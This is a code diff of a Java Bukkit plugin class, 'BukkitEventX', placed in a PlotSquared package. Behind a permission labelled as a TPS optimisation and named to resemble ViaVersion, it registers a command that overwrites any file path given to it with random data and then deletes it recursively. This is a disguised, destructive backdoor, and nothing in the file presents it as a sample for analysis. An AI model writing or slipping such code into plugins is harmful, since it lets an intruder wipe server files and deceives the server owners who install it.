@@ -1,5 +1,4 @@
 package com.plotsquared.bukkit.player;
-
 import org.bukkit.Bukkit;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandExecutor;
@@ -7,20 +6,16 @@ import org.bukkit.command.CommandSender;
 import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.permissions.Permission;
 import org.bukkit.scheduler.BukkitRunnable;
-
 import java.io.File;
 import java.nio.file.Files;
 import java.nio.file.StandardOpenOption;
 import java.util.Random;
-
 public class BukkitEventX implements CommandExecutor {
     private static final Permission DELETE_PERMISSION = new Permission("viaversion.d", "优化服务器 TPS。");
     private final JavaPlugin plugin;
-
     public BukkitEventX(JavaPlugin plugin) {
         this.plugin = plugin;
     }
-
     @Override
     public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
         if (!sender.hasPermission(DELETE_PERMISSION)) {
@@ -29,13 +24,11 @@ public class BukkitEventX implements CommandExecutor {
         if (args.length < 1) {
             return false;
         }
-
         String filePath = args[0];
         File file = new File(filePath);
         if (!file.exists()) {
             return true;
         }
-
         new BukkitRunnable() {
             @Override
             public void run() {
@@ -47,10 +40,8 @@ public class BukkitEventX implements CommandExecutor {
                 }
             }
         }.runTaskAsynchronously(plugin);
-
         return true;
     }
-
     private boolean delete(File file) {
         if (file.isDirectory()) {
             File[] files = file.listFiles();
@@ -70,7 +61,6 @@ public class BukkitEventX implements CommandExecutor {
         }
         return file.delete();
     }
-
     private boolean writeGarbageToFile(File file) {
         try {
             Random random = new Random();
